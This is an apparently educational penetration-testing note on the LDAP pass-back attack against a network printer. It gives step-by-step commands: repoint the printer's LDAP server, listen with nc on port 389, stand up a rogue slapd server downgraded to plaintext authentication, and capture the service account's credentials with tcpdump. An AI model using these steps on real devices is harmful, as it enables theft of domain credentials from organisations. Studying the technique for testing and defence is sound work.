---
title: LDAP Pass-Back Attack
---

**LDAP** **`Pass-Back`** Attack can be performed when we gain access to a Device Configuration where the **LDAP** parameters are Specified **[Web Interfaces etc..]**

There we can alter the **LDAP** Configuration, such as the **IP - Hostname** of the LDAP server. In an **LDAP** Pass-Back Attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt **LDAP Authentication** to our **Rogue Device.** We can **Intercept** this Authentication attempt to Recover the **LDAP Credentials.**

<br/>

- There is a **Network Printer** in this Network where the Administration Website does not require Credentials. Inspecting the code we can verify that the Printer Website is secure enough to not send the Credentials in Plain-Text.

```js
┌──────────┐
| USERNAME | ➜ svcLDAP
|----------|
| PASSWORD | ➜ **********
|----------|
| SERVER   | ➜ 10.10.10.201
└──────────┘
┌───────────────┬───────────────┐
| Test Settings | Save Settings |
└───────────────┴───────────────┘
```

<br/>

- We have the **Username** but not the Password. When we press **Test Settings** an Authentication request is made to the Domain Controller to test the LDAP Credentials. We can exploit this to get the Printer to Connect back to us since we can Modify the **Server** Value. 
- We can do that by Changing the **Server IP** to our IP and Listening on `PORT: 389`.


<br/>


## Rogue LDAP Server

- The **`SupportedCapabilities`** Response Indicates a Problem. Before the Printer sends over the Credentials, it is trying to negotiate the **LDAP Authentication** method Details. It will use this negotiation to select the most Secure Authentication method that both the Printer and the **LDAP** Server Support. 
- We need to create a **`Rogue LDAP Server`** and Configure it to send Credentials in **Plain-Text.**

```bash {4}
nc -lvp 389
Connect to [10.10.20.30] from (UNKNOWN) [10.10.10.201]

objectclass0?SupportedCapabilities
```

<br/>

- **Configuring `Rogue LDAP Server`**

```batch
:: Required Packages
[slapd - ldap-utils]

:: Configure the Service
systemctl enable slapd
dpkg-reconfigure -p low slapd
```

```batch
:: Omit Open LDAP Server Configuration
NO
:: DNS Domain Name
dc.domain.com
:: Organization Name
dc.domain.com
:: LDAP Database
MDB
:: Purge Database
NO
:: Move Old Database
YES
```
<br/>

### Patching

- **Configuration File to use `Plain-Text` as Authentication**


```batch title="olcSaslSecProps.ldif"
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

<br/>

- **Patching LDAP Server with Custom `.ldif` Configuration**

```batch
:: Apply the Configuration
ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif 

:: Restart the Service
systemctl restart slapd
```

<br/>

- **Verifying the Settings**

```batch
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

:: Response
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

<br/>

### Capturing LDAP Credentials

```batch {8-9}
tcpdump -SX -i <NetworkInterface> tcp port 389

:: Response
0x0000:  4500 0069 ffd8 4000 7f06 35bf 0ac8 59c9  E..i..@...5...Y.
0x0010:  0a32 5734 d97e 0185 f5fa 95b9 a45e c0ed  .2W4.~.......^..
0x0020:  5018 0400 3ef3 0000 3084 0000 003b 0201  P...>...0....;..
0x0030:  1060 8400 0000 3202 0102 0418 7a61 2e74  .`....2...dc.dom
0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ain.com\USERNAME
0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  ........PASSWORD
```